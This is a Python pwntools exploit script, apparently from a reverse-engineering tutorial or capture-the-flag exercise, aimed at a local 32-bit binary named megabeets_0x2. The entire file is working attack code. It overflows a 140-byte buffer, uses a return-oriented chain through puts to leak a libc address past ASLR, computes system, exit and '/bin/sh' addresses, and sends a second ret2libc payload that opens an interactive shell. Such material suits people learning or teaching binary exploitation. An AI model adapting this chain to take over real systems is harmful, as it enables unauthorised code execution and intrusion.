#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'

# Addresses
puts_plt = 0x8048390 # ?v sym.imp.puts
puts_got = 0x804a014 # ?v reloc.puts
entry_point = 0x080483d0 # ieq

# Offsets
offset_puts = 0x0005fca0 # dmi libc puts~ puts$
offset_system = 0x0003ada0 # dmi libc system~ system$
offset_str_bin_sh = 0x15ba0b # ?X 0xf76bfa0b-0xf7564000
offset_exit = 0x0002e9d0 # dmi libc exit~ exit$

def main():
	p = process('./megabeets_0x2')
	elf = ELF('./megabeets_0x2')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	assert libc.symbols['puts'] == offset_puts
	assert libc.symbols['system'] == offset_system
	assert next(libc.search('/bin/sh')) == offset_str_bin_sh
	assert libc.symbols['exit'] == offset_exit
	info('>>> Stage 1 <<<')
	# Initial payload
	payload = 'A' * 140 # padding
	ropchain = p32(puts_plt)
	ropchain += p32(entry_point)
	ropchain += p32(puts_got)
	payload = payload + ropchain
	p.clean()
	p.sendline(payload)
	# Take 4 bytes of the output
	leak = p.recv(4)
	puts_addr = u32(leak)
	success('puts is at: ' + hex(puts_addr))
	p.clean()
	# Calculate libc base
	libc_base = puts_addr - offset_puts
	success('libc base: ' + hex(libc_base))
	info('>>> Stage 2 <<<')
	# Calculate offsets
	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_str_bin_sh
	exit_addr = libc_base  + offset_exit
	success('system: ' + hex(system_addr))
	success('binsh: ' + hex(binsh_addr))
	success('exit: ' + hex(exit_addr))
	# Build 2nd payload
	payload2 = 'A' * 140
	ropchain2 = p32(system_addr)
	ropchain2 += p32(exit_addr)
	# Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)
	ropchain2 += p32(binsh_addr + 5)
	payload2 = payload2 + ropchain2
	p.sendline(payload2)
	success('Here comes the shell!')
	p.clean()
	p.interactive()

if __name__ == '__main__':
	main()
